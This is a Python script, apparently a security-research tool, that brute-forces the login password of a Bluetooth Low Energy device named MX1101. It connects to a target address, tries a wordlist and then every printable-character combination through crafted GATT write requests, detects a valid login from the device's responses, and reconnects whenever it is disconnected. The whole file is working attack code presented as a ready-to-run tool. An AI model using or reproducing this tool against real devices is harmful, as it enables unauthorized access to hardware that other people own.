#!/usr/bin/python
from scapy.all import * # Lazy import of scapy stuff
import binascii
import os
import argparse
from spangslelib import *

def initializeGlobals():
    global valid; valid = False
    global kicked; kicked = False
    global wordlistPassIndex; wordlistPassIndex = 0
    global passwords; passwords = []

    global validChars; validChars = []
    validChars.extend(range(0x61,0x7A+1)) # a-z
    validChars.extend(range(0x30,0x39+1)) # 0-9
    validChars.extend(range(0x41,0x5A+1)) # A-Z
    validChars.extend(range(0x20,0x2F+1)) # Special Chars
    validChars.extend(range(0x3A,0x40+1)) # Special Chars
    validChars.extend(range(0x5B,0x60+1)) # Special Chars
    validChars.extend(range(0x7B,0x7E+1)) # Special Chars

    global lastBrutePass; lastBrutePass = [-1,-1,-1,-1,-1,-1,-1,-1,-1,-1]
    global brutePassIndex; brutePassIndex = 0


############################### PACKET RESPONSES ########################
# What do you do with a sniffed packet?
def stopSniff(packetType):
    def respConnectRequest(packet): # 1
        # Determine if connection was successful
        data = binascii.hexlify(packet[1].build())
    # Open the file we want to write to
        if data[0:2]=='3e':
            con_status = binascii.hexlify(packet[2].build())
            if con_status[0:2]=='01': # Connection successful
                return True
        return False
    def respWaitForWriteResp(packet): # 2
        # Use for first packet tx, and auth req tx
        data = binascii.hexlify(packet[1].build())
        if data[0:2]=='13': # Write response detected
            return True # stop sniffing
        return False
    def respWaitForAuthResp(packet): # 3
        try:
            data = binascii.hexlify(packet[3].build())
            if data[0:2]=='1b': # Notification detected
                return True
        except IndexError: data =''
        return False
    def respConfigReadRequest(packet): # 4
        # Was I able to read? If so, we have a VALID login!
        try:
            data = binascii.hexlify(packet[4].build())
            if data[8:10]=='02': # Invalid login detected
                return True
            elif data[8:10]=='01': # Valid login detected
                global valid
                valid = True
                return True
        except IndexError: data =''
        # Did I get a disconnect?
        data = binascii.hexlify(packet[1].build())
        if data[0:2]=='05':
            global kicked
            kicked = True
            return True
        return False
    
    if packetType == 1: return respConnectRequest
    elif packetType == 2: return respWaitForWriteResp
    elif packetType == 3: return respWaitForAuthResp
    elif packetType == 4: return respConfigReadRequest
    
    # If all else fails, do nothing.
    return

################################ PASSWORD STUFF ######################################
# Initialize global list to store passwords from wordlist

def openWordList(wordlist):
    # Open password file
    if wordlist != '':
        try:
            with open(wordlist) as f:
                global passwords
                passwords = f.read().splitlines()
        except:
            print 'Cannot open file... quitting now!'
            sys.exit()

def grabNextPass():
    global wordlistPassIndex
    global passwords

    # If we still have passwords in the wordlist
    if wordlistPassIndex < len(passwords):
        nextPass = passwords[wordlistPassIndex]
        wordlistPassIndex+=1

    # Try making up one instead
    else:
        nextPass = generateBrutePass()

    return nextPass

def generateBrutePass():
    global lastBrutePass
    global brutePassIndex
    global validChars

    # Increment by 1 in our password odometer
    done = False
    i = 0
    while not done:
        try:
            lastBrutePass[i] += 1
            if lastBrutePass[i] >= len(validChars): # out of range now
                lastBrutePass[i] = 0
                i+=1
            else: done = True
        except IndexError: # we're tried all combinations!
            return ''
    
    # Translate password wheel into actual password
    nextPass = ''
    for curChar in lastBrutePass:
        if curChar >= 0: nextPass = chr(validChars[curChar]) + nextPass

    return nextPass


############################## MAIN FUNCTIONALITY ###########################
def bruteForce(btaddr):
    global kicked
    global valid

    # Create socket to communicate with BT device
    hci_socket = openBTSocket()

    curState = 'start'
    while curState !='done':
        kicked = False
        valid = False
        # Establish Connection
        if curState=='start':
            hci_socket.send(craftConnectReq(btaddr,'random'))
            hci_socket.sniff(stop_filter=stopSniff(1))

            hci_socket.send(craftWriteReq(0x001a,'0100'))
            hci_socket.sniff(stop_filter=stopSniff(2))
        
            curState='testing'

        elif curState=='testing':
            nextPass = grabNextPass()
            print 'Trying password: ' + nextPass
            # Turn password into ASCII
            nextPass = binascii.hexlify(nextPass)
            # Zero pad to 10 bytes (20 'spots')
            while len(nextPass) < 20:
                nextPass += '00'
            if len(nextPass) > 20:
                print 'Password ' + binascii.unhexlify(nextPass) + ' is too long! Truncating.'
                nextPass = nextPass[0:20]

            hci_socket.send(craftWriteReq(0x0019,'01010d051c01'+nextPass+'00'))
            hci_socket.sniff(stop_filter=stopSniff(3))
            hci_socket.send(craftWriteReq(0x0019,'01010a0a010000000000000001'))
            hci_socket.sniff(stop_filter=stopSniff(4))

            if kicked: 
                curState = 'kicked'
            if valid:
                print 'Found password!'
                curState = 'done'
 
        elif curState=='kicked':
            print 'Kicked! Attempting to reconnect...'
            curState = 'start'

    print 'Stopping...'
    time.sleep(1)
    hci_socket.send(craftDisconnectReq())
    time.sleep(1)

    hci_socket.close()

    os.system("hciconfig hci0 down")

def parseargs():
    parser = argparse.ArgumentParser(
            description='Brute force password on MX1101. Try word list first if provided.')
    parser.add_argument('-b', '--btaddress', required=True, help='BLE device address')
    parser.add_argument('-w', '--wordlist',\
                        help='Wordlist to try before forcing password',default='')
    return parser.parse_args()

def main():
    os.system("hciconfig hci0 down")
   
    # Grab target address and other parameters
    args = parseargs()
    btaddr = args.btaddress
    wordlist = args.wordlist

    # Initialize global variables
    initializeGlobals()

    # Read in the word list
    openWordList(wordlist)

    # Try passwords!
    bruteForce(btaddr)

if __name__ == "__main__":
    main()
    sys.exit(1)
